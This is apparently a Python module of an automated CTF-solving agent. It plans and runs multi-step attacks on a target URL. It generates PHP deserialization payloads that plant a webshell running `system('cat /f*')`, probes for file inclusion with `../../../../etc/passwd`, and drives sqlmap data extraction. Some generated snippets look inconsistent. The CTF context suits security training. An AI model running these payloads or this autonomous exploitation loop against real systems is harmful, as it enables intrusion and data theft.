# -*- coding: utf-8 -*-
"""
CTF Agent 自动化决策与执行模块 v2.1
=====================================

实现全自动解题流程：
- 自动决策下一步行动
- 持续解题直到成功或明确失败
- 即时反馈与报告
- 自动保存经验

使用方式:
    from agent_core import AutoAgent

    agent = AutoAgent()
    agent.solve_challenge(
        url="https://target.com",
        hint="有没有手机"
    )
"""

import hashlib
import re
import json
from urllib.parse import urljoin
from typing import Dict, List, Any, Optional, Callable

from tools import (
    get_memory, reset_memory, execute_python_poc, execute_command,
    extract_flags, get_memory_summary, init_problem, get_agent_context,
    quick_dir_scan, sqlmap_scan_url, sqlmap_deep_scan_url,
)
from long_memory import auto_save_experience
from graph_manager import GraphManager

# 引入源码分析器
try:
    from workspace.source_analyzer import analyze_php, format_analysis
    SOURCE_ANALYSIS_AVAILABLE = True
except ImportError:
    SOURCE_ANALYSIS_AVAILABLE = False


class AttackStep:
    """攻击步骤"""
    def __init__(self, name: str, description: str, code: str = "",
                 depends_on: List[str] = None, required: bool = True):
        self.name = name
        self.description = description
        self.code = code
        self.depends_on = depends_on or []
        self.required = required
        self.completed = False
        self.result = None


class AgentNeedsHelpException(Exception):
    """Raised when the agent cannot proceed without human assistance."""

    def __init__(self, message: str):
        super().__init__(message)
        self.message = message


class AttackPlan:
    """攻击计划"""

    def __init__(self, vuln_type: str, target_url: str):
        self.vuln_type = vuln_type
        self.target_url = target_url
        self.steps: List[AttackStep] = []
        self.current_step = 0
        self.prerequisites: List[str] = []  # 攻击前提条件

    def add_step(self, step: AttackStep):
        """添加攻击步骤"""
        self.steps.append(step)

    def add_prerequisite(self, prereq: str):
        """添加攻击前提"""
        self.prerequisites.append(prereq)

    def get_next_step(self) -> Optional[AttackStep]:
        """获取下一个待执行的步骤"""
        for i, step in enumerate(self.steps):
            if not step.completed:
                # 检查依赖是否满足
                if step.depends_on:
                    deps_satisfied = all(
                        self.get_step_by_name(d).completed
                        for d in step.depends_on if self.get_step_by_name(d)
                    )
                    if not deps_satisfied:
                        continue
                self.current_step = i
                return step
        return None

    def get_step_by_name(self, name: str) -> Optional[AttackStep]:
        """通过名称获取步骤"""
        for step in self.steps:
            if step.name == name:
                return step
        return None

    def mark_step_completed(self, step_name: str, result: str = ""):
        """标记步骤完成"""
        step = self.get_step_by_name(step_name)
        if step:
            step.completed = True
            step.result = result

    def is_complete(self) -> bool:
        """检查是否所有必需步骤已完成"""
        return all(s.completed or not s.required for s in self.steps)

    def get_summary(self) -> str:
        """获取计划摘要"""
        lines = [f"[AttackPlan] {self.vuln_type} attack on {self.target_url}"]
        lines.append(f"Prerequisites: {self.prerequisites}")
        for i, step in enumerate(self.steps, 1):
            status = "✓" if step.completed else "○"
            lines.append(f"  {status} Step {i}: {step.name} - {step.description}")
        return "\n".join(lines)

class AttackPlanner:
    """
    攻击计划器

    根据漏洞类型和源码分析结果生成多步骤攻击计划
    """

    def create_plan(self, vuln_type: str, target_url: str,
                    source_analysis: Any = None) -> AttackPlan:
        """
        创建攻击计划

        Args:
            vuln_type: 漏洞类型
            target_url: 目标URL
            source_analysis: 源码分析结果

        Returns:
            AttackPlan 攻击计划对象
        """
        plan = AttackPlan(vuln_type, target_url)

        # 根据漏洞类型创建计划
        if vuln_type == "deserialization" and source_analysis:
            self._create_deserialization_plan(plan, source_analysis)
        elif vuln_type == "ua_bypass":
            self._create_ua_bypass_plan(plan)
        elif vuln_type == "sqli":
            self._create_sqli_plan(plan)
        elif vuln_type == "lfi":
            self._create_lfi_plan(plan)
        else:
            self._create_generic_plan(plan)

        return plan

    def _create_deserialization_plan(self, plan: AttackPlan, analysis: Any):
        """创建反序列化攻击计划"""
        patterns = {p.name for p in analysis.patterns}
        class_info = analysis.class_info[0] if analysis.class_info else None
        class_name = class_info.name if class_info else "main"

        # 检查是否是spl_autoload链
        has_full_chain = (
            "wakeup_config_control" in patterns and
            "destruct_file_write" in patterns and
            "destruct_with_unserialize" in patterns
        )

        if has_full_chain:
            plan.add_prerequisite("可控的unserialize_callback_func配置")
            plan.add_prerequisite("可写的.inc文件")

            # Step 1: 配置环境
            plan.add_step(AttackStep(
                name="configure_environment",
                description="设置unserialize_callback_func为spl_autoload",
                code=self._generate_step1_code(class_name),
                required=True
            ))

            # Step 2: 写入恶意代码
            plan.add_step(AttackStep(
                name="write_shell",
                description="通过__destruct写入webshell到settings.inc",
                code=self._generate_step2_code(class_name),
                depends_on=["configure_environment"],
                required=True
            ))

            # Step 3: 触发包含
            plan.add_step(AttackStep(
                name="trigger_include",
                description="反序列化不存在的类触发spl_autoload",
                code=self._generate_step3_code(class_name),
                depends_on=["write_shell"],
                required=True
            ))

            # Step 4: 验证flag
            plan.add_step(AttackStep(
                name="extract_flag",
                description="提取flag",
                depends_on=["trigger_include"],
                required=False
            ))

    def _generate_step1_code(self, class_name: str) -> str:
        """生成Step 1代码"""
        return f"""# Step 1: 配置环境 + 准备写入
import requests
import urllib.parse

base = "{class_name}"
settings = 'a:1:{{s:25:"unserialize_callback_func";s:12:"spl_autoload";}}'
# 写入PHP webshell
php_code = "<?php system('cat /f*');"
inner = f's:{{len(php_code)}}:"{{php_code}}"'

payload = f'O:4:"{class_name}":2:{{s:8:"settings";{{settings}}s:6:"params";s:{{len(inner)}}:"{{inner}}"}}'

url = base + "?data=" + urllib.parse.quote(payload)
r = requests.get(url, timeout=10, verify=False)
print(f"Step1 Status: {{r.status_code}}")
"""

    def _generate_step2_code(self, class_name: str) -> str:
        """生成Step 2代码"""
        return f"""# Step 2: 触发包含
import requests
import urllib.parse

base = "{class_name}"
# 反序列化不存在的类触发spl_autoload
payload = 'O:4:"{class_name}":2:{{s:8:"settings";a:1:{{s:25:"unserialize_callback_func";s:12:"spl_autoload";}}s:6:"params";s:19:"O:8:\"settings\":0:{{}}";}}'

url = base + "?data=" + urllib.parse.quote(payload)
r = requests.get(url, timeout=10, verify=False)
print(f"Step2 Response: {{r.text[:500]}}")
"""

    def _generate_step3_code(self, class_name: str) -> str:
        """生成Step 3代码（验证）"""
        return """# Step 3: 提取flag
import re
flags = re.findall(r'ctfshow{[^}]+}', r.text)
if flags:
    print(f"FLAG: {flags[0]}")
"""

    def _create_ua_bypass_plan(self, plan: AttackPlan):
        """创建UA绕过攻击计划"""
        plan.add_step(AttackStep(
            name="test_mobile_ua",
            description="测试Mobile UA",
            required=True
        ))
        plan.add_step(AttackStep(
            name="follow_redirect",
            description="跟随重定向",
            depends_on=["test_mobile_ua"],
            required=True
        ))

    def _create_sqli_plan(self, plan: AttackPlan):
        """创建SQL注入攻击计划"""
        plan.add_step(AttackStep(
            name="detect_sqli",
            description="检测SQL注入点",
            required=True
        ))
        plan.add_step(AttackStep(
            name="extract_data",
            description="提取数据",
            depends_on=["detect_sqli"],
            required=True
        ))

    def _create_lfi_plan(self, plan: AttackPlan):
        """创建文件包含攻击计划"""
        plan.add_step(AttackStep(
            name="test_lfi",
            description="测试文件包含",
            required=True
        ))

    def _create_generic_plan(self, plan: AttackPlan):
        """创建通用攻击计划"""
        plan.add_step(AttackStep(
            name="recon",
            description="信息收集",
            required=True
        ))
        plan.add_step(AttackStep(
            name="exploit",
            description="尝试利用",
            required=True
        ))


class AutoAgent:
    """
    全自动CTF解题Agent
    ==================

    核心设计理念：
    1. 永不中断：循环执行直到成功/明确失败
    2. 自动决策：基于输出和记忆决定下一步
    3. 即时反馈：拿到flag立即报告
    4. 自我修正：失败3次自动换策略

    Attributes:
        max_failures: 同一方法最大失败次数
        max_steps: 最大尝试步数
        verbose: 是否输出详细日志
    """

    def __init__(self, max_failures: int = 3, max_steps: int = 20, verbose: bool = True,
                 min_steps_before_help: Optional[int] = None):
        self.max_failures = max_failures
        self.max_steps = max_steps
        self.verbose = verbose
        self.memory = get_memory()
        self.agent_context = get_agent_context()
        self.init_result: Dict[str, Any] = {}
        self.target_url = ""
        self.target_type = "unknown"
        self.problem_classified = False
        self.current_step_num = 0
        self.last_action: Dict[str, Any] = {}
        self.last_result: str = ""
        self.source_code: str = ""
        self.source_analysis_result = None  # 存储源码分析结果
        self.attack_plan = None  # 存储攻击计划
        self.planner = AttackPlanner()  # 攻击计划器
        self.action_handlers = {
            "recon": self._execute_recon_action,
            "ua_test": self._execute_ua_test_action,
            "follow_redirect": self._execute_follow_redirect_action,
            "sqlmap_scan": self._execute_sqlmap_action,
            "sqlmap_deep_scan": self._execute_sqlmap_deep_action,
            "dir_scan": self._execute_dir_scan_action,
            "source_analysis": self._execute_source_analysis_action,
            "poc": self._execute_poc_action,
            "attack_step": self._execute_attack_step_action,
        }
        self.consecutive_help_triggers = 0
        self.last_help_reason: Optional[str] = None
        self.help_cooldown_remaining = 0
        self.step_budget_limit = max_steps
        self.graph_manager = GraphManager()
        if min_steps_before_help is None:
            self.min_steps_before_help = max(3, self.max_failures)
        else:
            self.min_steps_before_help = max(1, min_steps_before_help)

    def log(self, msg: str, level: str = "INFO"):
        """输出日志"""
        if self.verbose:
            prefix = f"[{level}]" if level else ""
            print(f"{prefix} {msg}")

    def initialize_challenge(self, url: str = "", hint: str = "", description: str = "",
                             source_code: str = "") -> Dict[str, Any]:
        """初始化题目上下文，供 orchestrator 与旧入口复用。"""
        init_result = init_problem(target_url=url, description=description, hint=hint)
        self.memory = get_memory()
        self.init_result = init_result
        self.target_url = init_result.get("target_url", url)
        self.target_type = init_result.get("problem_type", "unknown")
        self.agent_context = get_agent_context()
        self.graph_manager.reset()

        if hint:
            self._classify_problem(hint)
            if self.target_type and self.target_type != init_result.get("problem_type"):
                self.memory.update_target(problem_type=self.target_type)
                self.memory.set_context(problem_type=self.target_type)
                self.agent_context = get_agent_context()
                self.init_result["problem_type"] = self.target_type

        if source_code and SOURCE_ANALYSIS_AVAILABLE:
            self.source_code = source_code
            self._analyze_source_code(source_code)
            if self.source_analysis_result:
                self._create_attack_plan()

        if self.target_type == "unknown" and self.source_analysis_result:
            self.target_type = self.source_analysis_result.vuln_type
            self.memory.update_target(problem_type=self.target_type)
            self.memory.set_context(problem_type=self.target_type)
            self.agent_context = get_agent_context()
            self.init_result["problem_type"] = self.target_type
            self.log(f"[Analysis] Auto-classified as: {self.target_type}")

        self._refresh_graph_state()
        return self.init_result

    def _sync_agent_context(self) -> None:
        """同步最新短期记忆上下文。"""
        self.agent_context = get_agent_context()

    def _refresh_graph_state(self) -> List[Dict[str, Any]]:
        """刷新 graph findings，并回写到 resume-safe context。"""
        shared_findings = self.graph_manager.refresh_shared_findings(self.memory)
        if hasattr(self.memory, "context"):
            self.memory.context.shared_findings = list(shared_findings)
        self._sync_agent_context()
        return shared_findings

    def _latest_memory_step_for_action(
        self,
        action: Dict[str, Any],
        step_num: Optional[int] = None,
    ) -> Optional[Any]:
        """获取当前 action 最接近的 memory step。"""
        action_id = str((action or {}).get("id", ""))
        step = self.memory.latest_step_for_action(action_id)
        if step is not None:
            return step
        if step_num is not None and self.memory.steps:
            candidate = self.memory.steps[-1]
            if getattr(candidate, "num", 0) == step_num:
                return candidate
        return None

    def _reset_help_cooldown(self) -> None:
        """恢复后降低再次立即求助的概率。"""
        self.consecutive_help_triggers = 0
        self.last_help_reason = None
        self.help_cooldown_remaining = 2

    def resume_with_guidance(
        self,
        human_guidance: str,
        event_callback: Optional[Callable[[str, Dict[str, Any]], None]] = None,
    ) -> Dict[str, Any]:
        """在不重新初始化题目的前提下，基于人工提示继续主链。"""
        if not self.init_result:
            raise ValueError("Challenge not initialized. Call initialize_challenge() first.")

        guidance = human_guidance.strip()
        if not guidance:
            raise ValueError("human_guidance must not be empty")

        self._sync_agent_context()
        self.memory.apply_human_guidance(
            guidance=guidance,
            step=self.current_step_num,
            reason=self.last_help_reason or "resume",
        )
        self._sync_agent_context()
        self._reset_help_cooldown()
        resume_count = getattr(self.agent_context, "resume_count", 0)
        self.graph_manager.apply_graph_op(
            self.graph_manager.build_checkpoint_graph_op(
                "resume",
                metadata={"resume_count": resume_count},
            ),
            step=self.current_step_num,
            guidance=guidance,
            resume_count=resume_count,
        )
        self._refresh_graph_state()
        self._emit_event(
            event_callback,
            "resume",
            {
                "step": self.current_step_num,
                "guidance": guidance,
                "resume_count": resume_count,
            },
        )
        return self.run_main_loop(event_callback=event_callback, resume=True)

    def _emit_event(
        self,
        event_callback: Optional[Callable[[str, Dict[str, Any]], None]],
        stage: str,
        payload: Dict[str, Any],
    ) -> None:
        """向 orchestrator 发出阶段事件。"""
        if event_callback:
            event_callback(stage, payload)

    def _get_consecutive_failures(self) -> int:
        """返回当前连续失败次数。"""
        consecutive_failures = 0
        for step in reversed(self.memory.steps):
            if step.success:
                break
            consecutive_failures += 1
        return consecutive_failures

    def build_advisor_context(self) -> Dict[str, Any]:
        """构造 Advisor 阶段使用的上下文快照。"""
        shared_findings = self._refresh_graph_state()
        recent_steps = self.memory.steps[-3:]
        skill_content = self.init_result.get("skill_content") or getattr(self.agent_context, "skill_content", "")
        loaded_resources = self.init_result.get("loaded_resources") or self.init_result.get("resources") or {}
        help_history = list(getattr(self.agent_context, "help_history", [])[-3:])
        human_guidance = getattr(self.agent_context, "human_guidance", "")

        return {
            "target_url": self.target_url,
            "target_type": self.target_type,
            "hint": getattr(self.agent_context, "hint", ""),
            "problem_type": self.init_result.get("problem_type", self.target_type),
            "loaded_resources": loaded_resources,
            "skill_loaded": bool(skill_content),
            "skill_preview": skill_content[:200] if isinstance(skill_content, str) else "",
            "attack_plan_ready": bool(self.attack_plan),
            "consecutive_failures": self._get_consecutive_failures(),
            "memory_summary": get_memory_summary(),
            "human_guidance": human_guidance,
            "resume_count": getattr(self.agent_context, "resume_count", 0),
            "help_history": help_history,
            "shared_findings": shared_findings,
            "graph_summary": self.graph_manager.summary(),
            "recent_actions": [
                {
                    "tool": step.tool,
                    "target": step.target,
                    "success": step.success,
                }
                for step in recent_steps
            ],
        }

    def _create_attack_plan(self) -> None:
        """根据当前类型与源码分析结果创建攻击计划。"""
        if not self.target_url:
            return
        self.attack_plan = self.planner.create_plan(
            vuln_type=self.target_type,
            target_url=self.target_url,
            source_analysis=self.source_analysis_result,
        )

    def _generate_action_id(
        self,
        action_type: str,
        target: str = "",
        params: Optional[Dict[str, Any]] = None,
    ) -> str:
        payload = json.dumps(
            {
                "type": action_type,
                "target": target,
                "params": params or {},
            },
            ensure_ascii=False,
            sort_keys=True,
        )
        return hashlib.md5(payload.encode("utf-8")).hexdigest()[:12]

    def _build_action(
        self,
        action_type: str,
        target: str = "",
        description: str = "",
        intent: str = "",
        expected_tool: str = "",
        params: Optional[Dict[str, Any]] = None,
        metadata: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        normalized_params = dict(params or {})
        action = {
            "id": self._generate_action_id(action_type, target, normalized_params),
            "type": action_type,
            "target": target,
            "description": description,
            "intent": intent or description,
            "expected_tool": expected_tool or action_type,
            "params": normalized_params,
        }
        if metadata:
            action.update(metadata)
        action["graph_op"] = self.graph_manager.build_action_graph_op(action)
        return action

    def _expected_tool_for_attack_step(self, step_name: str, has_code: bool = False) -> str:
        if step_name in {"detect_sqli", "extract_data"}:
            return "sqlmap"
        if step_name == "exploit":
            return "dirsearch"
        if step_name in {
            "extract_flag",
            "configure_environment",
            "write_shell",
            "trigger_include",
            "test_mobile_ua",
            "follow_redirect",
            "test_lfi",
            "recon",
        }:
            return "python_poc"
        if has_code:
            return "python_poc"
        return "attack_step"

    def _canonical_tool_name(self, action: Dict[str, Any]) -> str:
        action_type = action.get("type", "unknown")
        params = action.get("params", {})
        step_name = action.get("step_name") or params.get("from_attack_step", "")
        has_code = bool(action.get("code") or params.get("code"))

        if action_type == "attack_step":
            return self._expected_tool_for_attack_step(step_name, has_code)

        tool_name = action.get("expected_tool") or action_type
        return {
            "recon": "python_poc",
            "ua_test": "python_poc",
            "follow_redirect": "python_poc",
            "poc": "python_poc",
            "source_analysis": "source_analysis",
            "dir_scan": "dirsearch",
            "dirsearch": "dirsearch",
            "sqlmap_scan": "sqlmap",
            "sqlmap_deep_scan": "sqlmap",
            "sqlmap": "sqlmap",
        }.get(tool_name, tool_name)

    def _build_memory_action_meta(self, action: Dict[str, Any]) -> Dict[str, str]:
        if not action:
            return {}
        action_type = str(action.get("type", ""))
        expected_tool = str(action.get("expected_tool") or action_type)
        return {
            "action_id": str(action.get("id", "")),
            "action_type": action_type,
            "expected_tool": expected_tool,
            "canonical_tool": self._canonical_tool_name(action),
        }

    def _count_recent_failures_by_tool(self, tool: str, window: int = 5) -> int:
        recent_steps = self.memory.steps[-window:] if window > 0 else self.memory.steps
        return sum(
            1
            for step in recent_steps
            if not step.success and (step.canonical_tool or step.tool) == tool
        )

    def _mark_action_completed(self, action: Dict[str, Any], result: str) -> None:
        if action.get("type") == "attack_step" and self.attack_plan:
            step_name = action.get("step_name")
            if step_name:
                self.attack_plan.mark_step_completed(step_name, result)

    def _build_executor_error(self, action: Dict[str, Any], message: str) -> str:
        return f"[{action.get('type', 'unknown')}] {message}"

    def _resolve_action_success(
        self,
        action: Dict[str, Any],
        default: bool = True,
        step_num: Optional[int] = None,
    ) -> bool:
        """优先使用 memory 中当前 action 的实际 success。"""
        step = self._latest_memory_step_for_action(action, step_num=step_num)
        if step is not None:
            return step.success
        return default

    def _generate_help_request(self, step_num: int, summary: str) -> str:
        last_action = self.last_action or {}
        last_action_desc = last_action.get("description") or last_action.get("type") or "unknown"
        return (
            f"第 {step_num} 步后需要人工介入。\n"
            f"目标: {self.target_url or 'unknown'}\n"
            f"题目类型: {self.target_type or 'unknown'}\n"
            f"最近动作: {last_action_desc}\n\n"
            f"当前摘要:\n{summary}"
        )

    def plan_next_action(self) -> Dict[str, Any]:
        action = dict(self._decide_next_action())
        action["expected_tool"] = self._canonical_tool_name(action)
        action["graph_op"] = self.graph_manager.build_action_graph_op(action)
        self.last_action = dict(action)
        return action

    def _execute_recon_action(self, action: Dict[str, Any]) -> str:
        target = action.get("target", self.target_url)
        code = f'''
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "{target}"
resp = requests.get(url, timeout=10, verify=False)
print(f"Status: {{resp.status_code}}")
print(f"Headers: {{dict(resp.headers)}}")
if 'Location' in resp.headers:
    print(f"Redirect: {{resp.headers['Location']}}")
flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}', resp.text)
if flags:
    print(f"FLAG_FOUND: {{flags[0]}}")
print(f"Content preview: {{resp.text[:500]}}")
'''
        return execute_python_poc(code, timeout=30, memory_meta=self._build_memory_action_meta(action))

    def _execute_ua_test_action(self, action: Dict[str, Any]) -> str:
        target = action.get("target", self.target_url)
        ua = action.get("params", {}).get("ua") or action.get("ua", "Mobile")
        code = f'''
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "{target}"
headers = {{"User-Agent": "{ua}"}}
resp = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
print(f"Status: {{resp.status_code}}")
print(f"Headers: {{dict(resp.headers)}}")
if 'Location' in resp.headers:
    print(f"Redirect to: {{resp.headers['Location']}}")
flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}', resp.text)
if flags:
    print(f"FLAG: {{flags}}")
if resp.status_code == 200:
    print(f"Content: {{resp.text}}")
'''
        return execute_python_poc(code, timeout=30, memory_meta=self._build_memory_action_meta(action))

    def _execute_follow_redirect_action(self, action: Dict[str, Any]) -> str:
        target = action.get("target", self.target_url)
        ua = action.get("params", {}).get("ua") or action.get("ua", "Mobile")
        code = f'''
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "{target}"
headers = {{"User-Agent": "{ua}"}}
resp = requests.get(url, headers=headers, timeout=10, verify=False)
print(f"Status: {{resp.status_code}}")
print(f"Content-Length: {{len(resp.text)}}")
flags = re.findall(r'ctfshow{{[^}}]+}}|flag{{[^}}]+}}|tfshow{{[^}}]+}}', resp.text)
if flags:
    print(f"FLAG_FOUND: {{flags[0]}}")
print(f"Content: {{resp.text}}")
'''
        return execute_python_poc(code, timeout=30, memory_meta=self._build_memory_action_meta(action))

    def _execute_sqlmap_action(self, action: Dict[str, Any]) -> str:
        return sqlmap_scan_url(
            action.get("target", self.target_url),
            memory_meta=self._build_memory_action_meta(action),
            **action.get("params", {}),
        )

    def _execute_sqlmap_deep_action(self, action: Dict[str, Any]) -> str:
        return sqlmap_deep_scan_url(
            action.get("target", self.target_url),
            memory_meta=self._build_memory_action_meta(action),
            **action.get("params", {}),
        )

    def _execute_dir_scan_action(self, action: Dict[str, Any]) -> str:
        params = action.get("params", {})
        return quick_dir_scan(
            action.get("target", self.target_url),
            extensions=params.get("extensions"),
            memory_meta=self._build_memory_action_meta(action),
        )

    def _execute_source_analysis_action(self, action: Dict[str, Any]) -> str:
        code = action.get("code") or action.get("params", {}).get("code") or self.source_code
        if not code:
            return self._build_executor_error(action, "source code unavailable")
        result = self._analyze_source_code(code)
        self.memory.add_step(
            tool="source_analysis",
            target="PHP code",
            params={},
            result=result,
            success=True,
            action_meta=self._build_memory_action_meta(action),
        )
        return result

    def _execute_poc_action(self, action: Dict[str, Any]) -> str:
        steps = action.get("steps") or action.get("params", {}).get("steps") or [action.get("code")]
        results = []
        memory_meta = self._build_memory_action_meta(action)
        for step_code in steps:
            if step_code:
                results.append(execute_python_poc(step_code, timeout=60, memory_meta=memory_meta))
        return "\n\n".join(results)

    def _execute_attack_step_action(self, action: Dict[str, Any]) -> str:
        step_name = action.get("step_name", "")
        code = action.get("code") or action.get("params", {}).get("code", "")

        if step_name == "recon":
            return self._execute_recon_action(
                self._build_action(
                    "recon",
                    target=action.get("target", self.target_url),
                    description=action.get("description", "信息收集"),
                    intent="执行通用侦察以收集首页线索",
                    expected_tool="python_poc",
                    params={"from_attack_step": step_name},
                )
            )

        if step_name == "test_mobile_ua":
            ua_action = self._build_action(
                "ua_test",
                target=action.get("target", self.target_url),
                description=action.get("description", "测试Mobile UA"),
                intent="验证目标是否存在 UA 绕过",
                expected_tool="python_poc",
                params={"ua": "Mobile", "from_attack_step": step_name},
            )
            return self._execute_ua_test_action(ua_action)

        if step_name == "follow_redirect":
            redirect_target = action.get("target") or self.target_url
            if redirect_target == self.target_url and self.memory.steps:
                redirect_candidate = self._extract_redirect(self.memory.steps[-1].result)
                if redirect_candidate:
                    redirect_target = f"{self.target_url.rstrip('/')}/{redirect_candidate.lstrip('/')}"
            follow_action = self._build_action(
                "follow_redirect",
                target=redirect_target,
                description=action.get("description", "跟随重定向"),
                intent="访问重定向目标并继续提取线索",
                expected_tool="python_poc",
                params={"ua": "Mobile", "from_attack_step": step_name},
            )
            return self._execute_follow_redirect_action(follow_action)

        if step_name == "detect_sqli":
            return self._execute_sqlmap_action(
                self._build_action(
                    "sqlmap_scan",
                    target=action.get("target", self.target_url),
                    description=action.get("description", "检测SQL注入点"),
                    intent="用 sqlmap 验证注入点",
                    expected_tool="sqlmap",
                    params={"batch": True},
                )
            )

        if step_name == "extract_data":
            return self._execute_sqlmap_deep_action(
                self._build_action(
                    "sqlmap_deep_scan",
                    target=action.get("target", self.target_url),
                    description=action.get("description", "提取数据"),
                    intent="提升扫描等级以提取数据",
                    expected_tool="sqlmap",
                    params={"batch": True},
                )
            )

        if step_name == "test_lfi":
            payload_target = action.get("target", self.target_url)
            if "?" not in payload_target:
                payload_target = f"{payload_target}?file=../../../../etc/passwd"
            return self._execute_recon_action(
                self._build_action(
                    "recon",
                    target=payload_target,
                    description=action.get("description", "测试文件包含"),
                    intent="读取典型敏感文件验证 LFI",
                    expected_tool="python_poc",
                    params={"from_attack_step": step_name},
                )
            )

        if step_name == "exploit":
            return self._execute_dir_scan_action(
                self._build_action(
                    "dir_scan",
                    target=action.get("target", self.target_url),
                    description=action.get("description", "尝试利用前先补充目录扫描"),
                    intent="先扩展端点情报，再决定利用方式",
                    expected_tool="dirsearch",
                    params={"extensions": ["php", "bak", "txt"], "from_attack_step": step_name},
                )
            )

        if step_name == "extract_flag":
            recent_text = "\n\n".join(str(step.result) for step in self.memory.steps[-3:])
            flags = extract_flags(recent_text)
            if flags:
                return f"FLAG_FOUND: {flags[0]}"
            return self._build_executor_error(action, "flag not found in recent outputs")

        if code:
            return self._execute_poc_action(action)

        return self._build_executor_error(action, f"unsupported attack step: {step_name}")

    def maybe_request_help(self, step_num: int) -> Optional[str]:
        """根据当前状态判断是否需要求助。"""
        if not self._should_ask_for_help():
            return None

        summary = get_memory_summary()
        help_request = self._generate_help_request(step_num, summary)
        self.memory.add_help_entry(
            request=help_request,
            reason=self.last_help_reason or "",
            step=step_num,
        )
        self._sync_agent_context()
        return help_request

    def _starting_step_num(self, resume: bool = False) -> int:
        """返回本轮主循环的起始 step 编号。"""
        if resume and self.current_step_num > 0:
            return self.current_step_num + 1
        return 1

    def _max_step_for_current_run(self, resume: bool = False) -> int:
        """返回当前主循环允许执行到的最大 step 编号。"""
        if resume:
            return max(self.max_steps, self.current_step_num + self.step_budget_limit)
        return self.max_steps

    def solve_challenge(self, url: str = "", hint: str = "", description: str = "",
                        source_code: str = "") -> Dict[str, Any]:
        """
        全自动解题主入口

        Args:
            url: 目标URL
            hint: 题目提示
            description: 题目描述
            source_code: PHP源码（可选，用于代码分析）

        Returns:
            解题结果
        """
        self.initialize_challenge(
            url=url,
            hint=hint,
            description=description,
            source_code=source_code
        )
        return self.run_main_loop()

    def run_main_loop(
        self,
        event_callback: Optional[Callable[[str, Dict[str, Any]], None]] = None,
        resume: bool = False,
    ) -> Dict[str, Any]:
        """执行唯一主循环。"""
        self._sync_agent_context()
        if not resume:
            self.help_cooldown_remaining = 0
        self.log(f"=" * 60)
        self.log(f"[Agent] 开始自动化解题: {self.target_url}")
        self.log(f"[Hint] {self.agent_context.hint}")
        if resume and getattr(self.agent_context, "human_guidance", ""):
            self.log(f"[Guidance] {self.agent_context.human_guidance}", "INFO")
        self.log(f"=" * 60)

        start_step = self._starting_step_num(resume=resume)
        max_step = self._max_step_for_current_run(resume=resume)
        for step_num in range(start_step, max_step + 1):
            self.current_step_num = step_num
            self.log(f"\n[Step {step_num}/{max_step}] ---")

            self._sync_agent_context()
            advisor_context = self.build_advisor_context()
            self._emit_event(
                event_callback,
                "advisor",
                {
                    "step": step_num,
                    "context": advisor_context,
                },
            )

            action = self.plan_next_action()
            self.log(f"决策: {action['type']}", "DECISION")
            self.graph_manager.apply_graph_op(
                action.get("graph_op"),
                action=action,
                step=step_num,
            )
            self._emit_event(
                event_callback,
                "planner",
                {
                    "step": step_num,
                    "action": dict(action),
                },
            )

            try:
                self._emit_event(
                    event_callback,
                    "executor",
                    {
                        "step": step_num,
                        "action": dict(action),
                    },
                )
                result = self._execute_action(action)
                self.last_result = result
                action_success = self._resolve_action_success(action, default=True, step_num=step_num)
                self.graph_manager.apply_graph_op(
                    action.get("graph_op"),
                    action=action,
                    step=step_num,
                    success=action_success,
                    result=result,
                    memory_step=self._latest_memory_step_for_action(action, step_num=step_num),
                )
                self._refresh_graph_state()
                self._emit_event(
                    event_callback,
                    "tool_node",
                    {
                        "step": step_num,
                        "action": dict(action),
                        "result": result,
                        "success": action_success,
                    },
                )

                flags = extract_flags(result)
                if flags:
                    flag = flags[0]
                    self.log(f"=" * 60)
                    self.log(f"[SUCCESS] FLAG FOUND: {flag}", "SUCCESS")
                    self.log(f"=" * 60)

                    self._auto_save_experience(flag)

                    return {
                        "success": True,
                        "flag": flag,
                        "steps": step_num,
                        "message": f"步骤{step_num}: 成功获取flag"
                    }

                clues = self._analyze_output(result)
                self.log(f"发现线索: {clues}", "ANALYSIS")

            except Exception as e:
                self.last_result = str(e)
                self.log(f"执行失败: {e}", "ERROR")
                self.memory.add_step(
                    tool=self._canonical_tool_name(action),
                    target=action.get("target", self.target_url),
                    params={},
                    result=str(e),
                    success=False,
                    action_meta=self._build_memory_action_meta(action),
                )
                self.graph_manager.apply_graph_op(
                    action.get("graph_op"),
                    action=action,
                    step=step_num,
                    success=False,
                    result=str(e),
                    memory_step=self._latest_memory_step_for_action(action, step_num=step_num),
                )
                self._refresh_graph_state()
                self._emit_event(
                    event_callback,
                    "tool_node",
                    {
                        "step": step_num,
                        "action": dict(action),
                        "result": str(e),
                        "success": False,
                    },
                )

            help_request = self.maybe_request_help(step_num)
            if help_request:
                self.log("=" * 60)
                self.log("[AGENT] 无法继续，需要人类干预！", "HELP")
                self.log("=" * 60)
                self.graph_manager.apply_graph_op(
                    self.graph_manager.build_checkpoint_graph_op(
                        "help",
                        action=action,
                        reason=self.last_help_reason or "",
                    ),
                    action=action,
                    step=step_num,
                    message=help_request,
                    reason=self.last_help_reason or "",
                )
                self._refresh_graph_state()
                self._emit_event(
                    event_callback,
                    "help",
                    {
                        "step": step_num,
                        "message": help_request,
                        "reason": self.last_help_reason,
                    },
                )

                raise AgentNeedsHelpException(help_request)

        final_help = (
            f"已尝试{max_step}步仍未获得flag，所有自动策略均已失败。\n\n"
            f"最终状态:\n{get_memory_summary()}"
        )
        self.graph_manager.apply_graph_op(
            self.graph_manager.build_checkpoint_graph_op(
                "help",
                action=self.last_action,
                reason="max_steps",
            ),
            action=self.last_action,
            step=max_step,
            message=final_help,
            reason="max_steps",
        )
        self._refresh_graph_state()
        self._emit_event(
            event_callback,
            "help",
            {
                "step": max_step,
                "message": final_help,
                "reason": "max_steps",
            },
        )
        raise AgentNeedsHelpException(final_help)

    def reset(self):
        """重置Agent状态"""
        reset_memory()
        self.memory = get_memory()
        self.agent_context = get_agent_context()
        self.init_result = {}
        self.target_url = ""
        self.target_type = "unknown"
        self.problem_classified = False
        self.current_step_num = 0
        self.last_action = {}
        self.last_result = ""
        self.source_code = ""
        self.source_analysis_result = None
        self.attack_plan = None
        self.consecutive_help_triggers = 0
